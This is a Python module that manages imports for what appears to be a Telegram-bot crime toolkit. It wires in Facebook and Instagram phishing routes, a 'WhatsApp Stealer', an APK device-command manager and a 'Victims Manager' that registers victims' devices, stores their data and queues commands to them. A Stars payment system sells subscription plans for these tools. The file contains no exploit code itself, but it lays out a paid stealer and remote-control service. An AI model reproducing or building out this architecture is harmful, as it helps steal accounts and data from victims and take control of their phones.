# imports_manager.py
# ============================================================
# استيراد كل الأدوات مع Fallback آمن
# v7 — بعد حذف RAT / QR / LSH / SH
# ============================================================

import io
from telebot.types import InlineKeyboardMarkup

from logging_config import get_logger

logger = get_logger("imports_manager")


# ============================================================
# Facebook
# ============================================================
try:
    from facebook_module import init_facebook_routes
    logger.info("[+] facebook_module imported")
except Exception as e:
    logger.error(f"facebook_module: {e}")
    init_facebook_routes = lambda app, bot: None


# ============================================================
# Instagram
# ============================================================
try:
    from instagram_module import init_instagram_routes
    logger.info("[+] instagram_module imported")
except Exception as e:
    logger.error(f"instagram_module: {e}")
    init_instagram_routes = lambda app, bot: None


# ============================================================
# WhatsApp Stealer
# ============================================================
try:
    from wa_stealer import (
        init_whatsapp_stealer_routes,
        wa_bp,
        get_wa_data,
        build_wa_panel,
        create_wa_session,
        get_wa_session,
    )
    WA_ENABLED = True
    logger.info("[+] wa_stealer imported")
except Exception as e:
    logger.error(f"wa_stealer: {e}")
    WA_ENABLED = False

    def init_whatsapp_stealer_routes(app, bot):
        pass

    wa_bp = None

    def get_wa_data(session_id):
        return {"storage": None, "idb": None, "chunks_count": 0}

    def build_wa_panel(session_id, chat_id):
        return InlineKeyboardMarkup()

    def create_wa_session(session_id, chat_id):
        return None

    def get_wa_session(session_id):
        return None


# ============================================================
# APK Manager
# ============================================================
try:
    from apk_manager import (
        init_apk_routes,
        apk_bp,
        build_apk_panel,
        push_apk_command,
        create_apk_code,
        get_apk_code,
        get_apk_devices,
        get_apk_device,
    )
    APK_MANAGER_ENABLED = True
    logger.info("[+] apk_manager imported")
except Exception as e:
    logger.error(f"apk_manager: {e}")
    APK_MANAGER_ENABLED = False

    def init_apk_routes(app, bot):
        pass

    apk_bp = None

    def build_apk_panel(device_id):
        return InlineKeyboardMarkup()

    def push_apk_command(*a, **kw):
        return False

    def create_apk_code(chat_id):
        return None

    def get_apk_code(code):
        return None

    def get_apk_devices():
        return []

    def get_apk_device(device_id):
        return None


# ============================================================
# Victims Manager
# ============================================================
try:
    from victims_manager import (
        create_victim, get_victim, get_all_victims, delete_victim,
        update_victim_status, rename_victim,
        find_victim_by_token, register_victim_device,
        add_victim_data, get_victim_data,
        queue_victim_command, pop_victim_commands,
        get_victim_stats, has_victim_commands,
    )
    VICTIMS_ENABLED = True
    logger.info("[+] victims_manager imported")
except Exception as e:
    logger.exception(f"victims_manager: {e}")
    VICTIMS_ENABLED = False

    def create_victim(*a, **kw):
        return None

    def get_victim(*a, **kw):
        return None

    def get_all_victims(*a, **kw):
        return []

    def delete_victim(*a, **kw):
        return False

    def update_victim_status(*a, **kw):
        return False

    def rename_victim(*a, **kw):
        return False

    def find_victim_by_token(*a, **kw):
        return None

    def register_victim_device(*a, **kw):
        return False

    def add_victim_data(*a, **kw):
        return False

    def get_victim_data(*a, **kw):
        return []

    def queue_victim_command(*a, **kw):
        return False

    def pop_victim_commands(*a, **kw):
        return []

    def get_victim_stats(*a, **kw):
        return {}

    def has_victim_commands(*a, **kw):
        return False


# ============================================================
# Stars Payment
# ============================================================
try:
    from stars_payment import (
        register_payment_handlers, get_or_create_user, can_use_tool,
        consume_usage, build_plans_keyboard, build_main_payment_keyboard,
        build_account_text, build_plans_text, send_invoice,
        PRICING_PLANS, FREE_TRIAL_USES, AVAILABLE_TOOLS,
        is_admin, is_vip, get_all_users, get_user, save_user,
        delete_user, ban_user, unban_user, activate_subscription,
        build_admin_menu, build_admin_users_keyboard,
        build_user_detail_keyboard, build_user_info_text,
        build_admin_stats_text, ADMIN_IDS, VIP_IDS,
    )
    PAYMENT_ENABLED = True
    logger.info("[+] stars_payment imported")
except Exception as e:
    logger.error(f"stars_payment: {e}")
    PAYMENT_ENABLED = False

    def register_payment_handlers(bot):
        pass

    def get_or_create_user(*a, **kw):
        return {}

    def can_use_tool(*a, **kw):
        return {"allowed": True, "reason": "bypass"}

    def consume_usage(*a, **kw):
        return True

    def build_plans_keyboard():
        return InlineKeyboardMarkup()

    def build_main_payment_keyboard():
        return InlineKeyboardMarkup()

    def build_account_text(*a, **kw):
        return "نظام الدفع معطّل"

    def build_plans_text():
        return "نظام الدفع معطّل"

    def send_invoice(*a, **kw):
        pass

    PRICING_PLANS = {}
    FREE_TRIAL_USES = 3
    AVAILABLE_TOOLS = ["fb", "ig", "apk", "wa"]

    def is_admin(uid):
        return False

    def is_vip(uid):
        return False

    def get_all_users():
        return []

    def get_user(uid):
        return None

    def save_user(uid, u):
        return False

    def delete_user(uid):
        return False

    def ban_user(uid):
        return False

    def unban_user(uid):
        return False

    def activate_subscription(uid, pk):
        return {}

    def build_admin_menu():
        return InlineKeyboardMarkup()

    def build_admin_users_keyboard(*a, **kw):
        return InlineKeyboardMarkup()

    def build_user_detail_keyboard(*a, **kw):
        return InlineKeyboardMarkup()

    def build_user_info_text(*a, **kw):
        return ""

    def build_admin_stats_text():
        return ""

    ADMIN_IDS = []
    VIP_IDS = []


# ============================================================
# ملخص الاستيراد
# ============================================================
logger.info(
    f"Imports Summary | "
    f"WA={WA_ENABLED} | "
    f"APK_MGR={APK_MANAGER_ENABLED} | "
    f"VICTIMS={VICTIMS_ENABLED} | "
    f"PAYMENT={PAYMENT_ENABLED}"
)
